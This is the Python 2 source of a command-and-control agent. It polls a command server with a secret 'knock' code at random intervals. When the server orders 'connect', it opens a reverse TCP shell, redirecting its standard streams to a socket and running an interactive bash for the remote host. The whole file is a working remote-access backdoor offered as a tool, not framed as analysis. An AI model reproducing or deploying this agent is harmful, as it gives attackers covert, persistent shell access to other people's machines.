import socket, subprocess, os, sys

def main():
	import optparse
	parser = optparse.OptionParser()
	parser.add_option('-i', '--ip', action='store', dest='command_server_ip_address', type='string', help='The ip/hostname for the command server')
	parser.add_option('-p', '--port', action='store', dest='command_server_port', default='9001', type='int', help='The port that the command server is listening on')
	parser.add_option('-k', '--knock', action='store', dest='knock_code', type='string', help='The secret knock code that identifies this agent')
	#parser.add_option('-c', '--create', action='store_const', const=True, dest='create_knock', help='Use this option to register a new knock with command server')
	options, args = parser.parse_args()
	if options.command_server_ip_address != None:
		if options.knock_code != None:
			print "Connecting agent to command server on " + options.command_server_ip_address + ':' + str(options.command_server_port) + ' using knock: ' + options.knock_code + '.'
			#if options.create_knock == True:
			#	print "Attempting to register " + options.knock_code + ' with command server.'
			#	print "Command Server: " + str(Client(options.knock_code, options.command_server_ip_address, options.command_server_port).create_knock())  
			#else:
			Client(options.knock_code, options.command_server_ip_address, options.command_server_port).start()

		else:
			parser.print_help()
			sys.exit(1)
	else:
		parser.print_help()
		sys.exit(1)

class Interpreter:
        def __init__(self, command, ip=''):
                self.SUCCESS = 0
                self.FAILURE = -1
                self.commandString = command
                self.command = command.strip().split(' ')
                self.ip = ip

        def set_ip(self, ip):
                self.ip = ip

        def start(self):
                commandString = self.commandString
                command = self.command
                for i in range(1, len(commandString) -2):
                        if not commandString[i].isalnum():
                                if commandString[i] != ':' and commandString[i] != ' ' and commandString[i] != '=' and commandString[i] != '|' and commandString[i] != '.':
                                        #print "Invalid character in knock."
                                        return (self.FAILURE, "Command server: Invalid character in knock.")
                if command[0] != '>':
                        #print "No start header."
                        return (self.FAILURE, "Command server: No start header. ")

                elif command[-1] != '<':
                        #print "No end header."
                        return (self.FAILURE, "Command server: No end header. ")


                elif len(commandString) < 8:
                        #print "Invalid length"
                        return (self.FAILURE, "Command server: Invalid length.")

                elif '|' in commandString:
                        try:
                                if commandString.split('|')[0].split(' ')[1] == 'ip:':
                                        ip = commandString.split('|')[0].split(' ')[2]
                                else:
                                        return (self.FAILURE, 'Command Server: expected "ip:" parameter ')

                                if commandString.split('|')[1].split(' ')[1] == 'status:':
                                        status = commandString.split('|')[1].split(' ')[2]
                                else:
                                        return (self.FAILURE, 'Command server: Expected "status:" parameter')
                                return  (self.SUCCESS,ip, status)
                        except:
                                return (self.FAILURE, 'Command server: Malformed Request')
                else:
                        return (self.FAILURE, 'Command server: ' + commandString.replace('<','').replace('>','').strip())

class Negotiate:
        def __init__(self, knock, ip, port=9001):
                self.SUCCESS = 0
                self.FAILURE = -1
                self.ip = ip
                self.port = port
                self.knock = knock

        def request(self):
                try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((self.ip, self.port))
                        sock.sendall('> select: ' + self.knock + ' <')
                        raw = sock.recv(64)
                        message = raw.split(',')[1].strip().replace(')','')[1:-1]
			sock.close()
                        return (Interpreter(message).start())
                except Exception as e:
                        print e
                        return (self.FAILURE, "Could not establish connection to command server (" + str(self.ip) + ":" + str(self.port) + ")")
		
	def create(self):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((self.ip, self.port))
			sock.sendall('> create: ' + self.knock + ' <')
			raw = sock.recv(64)
			message = raw.split(',')[1].strip().replace(')','')[1:-1]
			sock.close()
			return (self.SUCCESS, message)
		except:
			return (self.FAILURE, "> Could not establish connection to knock server. <")
		
	def update(self, status):
		try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((self.ip, self.port))
                        sock.sendall('> update: ' + self.knock + ' = ' + status + ' <')
                        raw = sock.recv(64)
                        message = raw.split(',')[1].strip().replace(')','')[1:-1]
                        sock.close()
			return (self.SUCCESS, message)
		except:
                        return (self.FAILURE, "> Could not establish connection to knock server. <")
			

class ReverseShell:
        def __init__(self, ip, port=9002):
		self.SUCCESS = 0
		self.FAILURE = 1
                self.ip = ip
                self.port = port

        def start(self):
		sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		#Save previous standard std and descriptors
		prevOutFd = os.dup(1)	
		prevInFd = os.dup(0)
		prevErrFd = os.dup(2)
		#Open socket
		try:
			sock.connect((self.ip,self.port))
		except:
			return self.FAILURE
		#Redirect standard in, out, and error
		os.dup2(sock.fileno(),0)
		os.dup2(sock.fileno(),1)
		os.dup2(sock.fileno(),2)
		#Pass the shell
		subprocess.call(["/bin/bash","-i"])
		#Kill the socket
		sock.shutdown(socket.SHUT_RDWR)
		sock.close()
		#Restore standard in, out, and error
		os.dup2(prevOutFd, 1)
		os.close(prevOutFd)
		os.dup2(prevInFd, 0)
		os.close(prevInFd)
		os.dup2(prevErrFd,2)
		os.close(prevErrFd)
		return self.SUCCESS

class Client:
        def __init__(self, knock, serverIp, serverPort=9001, managePort=9002):
		self.SUCCESS = 0
		self.FAILURE = 1
                self.knock = knock
                self.serverIp = serverIp
                self.serverPort = serverPort
                self.managePort = managePort

	def create_knock(self):
		return Negotiate(self.knock, self.serverIp, self.serverPort).create()
        def _check_status(self):
                return Negotiate(self.knock, self.serverIp, self.serverPort).request()

	def _update_status(self, status):
                return Negotiate(self.knock, self.serverIp, self.serverPort).update(status)

        def start(self):
                import random, time
                while True:
                        sleepTime = random.randint(5,10) #Random check increments
                        time.sleep(sleepTime)
                        response = self._check_status()
			try:
                        	print "Command server: instructs this agent to " + '"' + str(response[2]) + '"'
			except: 
				print response
                        if response[0] == 0: #Check the status for a particular knock
                                if response[2] == 'connect': #If connect status is found open reverse-tcp shell
                                        shell = ReverseShell(response[1], self.managePort)
					print "Agent: Connecting on " + response[1] + ":" + str(self.managePort)
                                      	exitCode = shell.start()
					print "Agent: Reverse shell exited with error code " + str(exitCode)
					if exitCode == self.SUCCESS:
						print 'Agent: Setting status to "wait"'
						self._update_status('wait')
					

                        else:
                                return response


if __name__ == "__main__":
	main()
